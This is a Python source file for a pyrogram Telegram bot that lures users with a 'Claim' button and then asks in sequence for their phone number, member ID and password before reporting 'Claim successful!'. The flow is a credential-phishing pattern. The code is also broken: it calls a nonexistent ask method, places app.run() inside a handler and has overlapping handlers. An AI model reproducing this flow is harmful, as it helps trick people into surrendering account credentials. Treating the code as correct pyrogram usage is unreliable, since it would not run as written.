import os
import logging
import asyncio
from decouple import config
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
from random import choice 
from pyrogram import Client, filters
from pyrogram.raw.types import UpdateNewMessage

logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s', level=logging.INFO)

# start the bot
print("Starting...")
print("Initializing RyzenApi")
print("Initializing Repo")

class Var(object):
    APP_ID = int(os.environ.get("APP_ID", 6))
    API_HASH = os.environ.get("API_HASH", "eb06d4abfb49dc3eeb1aeb98ae0f581e")
    BOT_TOKEN = os.environ.get("BOT_TOKEN", None)
    
app = Client(
    'AutoAnime',
    api_id=Var.APP_ID,
    api_hash=Var.API_HASH,
    bot_token=Var.BOT_TOKEN,
)


def send_claim_photo(chat_id):
    photo = "https://graph.org/file/af9d5202cc3d21b3254a5.jpg"  # Path to the photo you want to send

    # Create inline keyboard with the "Claim" button
    keyboard = [
        [InlineKeyboardButton("Claim", callback_data="claim")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Send the photo with the inline button
    app.send_photo(chat_id, photo=photo, caption="Click the button to claim:", reply_markup=reply_markup)


def ask_phone_number(chat_id, message_id):
    app.ask(chat_id, "Please enter your phone number:", reply_to_message_id=message_id)


def ask_member_id(chat_id, message_id):
    app.ask(chat_id, "Please enter your member ID:", reply_to_message_id=message_id)


def ask_password(chat_id, message_id):
    app.ask(chat_id, "Please enter your password:", reply_to_message_id=message_id)


@app.on_message(filters.command("claim"))
def start_claim(_, message):
    chat_id = message.chat.id

    # Step 1: Send the claim photo with inline button
    send_claim_photo(chat_id)


@app.on_callback_query(filters.regex("claim"))
def handle_claim_button(_, callback_query):
    chat_id = callback_query.message.chat.id
    message_id = callback_query.message.message_id

    # Step 2: Ask for phone number
    ask_phone_number(chat_id, message_id)


@app.on_message(filters.regex(r"^\+\d+$"))
def handle_phone_number(_, message):
    chat_id = message.chat.id

    # Step 3: Ask for member ID
    ask_member_id(chat_id, message.message_id)


@app.on_message(filters.regex(r"^\d+$"))
def handle_member_id(_, message):
    chat_id = message.chat.id

    # Step 4: Ask for password
    ask_password(chat_id, message.message_id)


@app.on_message(filters.text)
def handle_password(_, message):
    chat_id = message.chat.id

    # Step 5: Send the final image
    image_path = "https://graph.org/file/af9d5202cc3d21b3254a5.jpg"  # Path to the final image you want to send
    app.send_photo(chat_id, photo=image_path, caption="Claim successful!")

    app.run()



print("Bot Initialized Perhaps Started!")
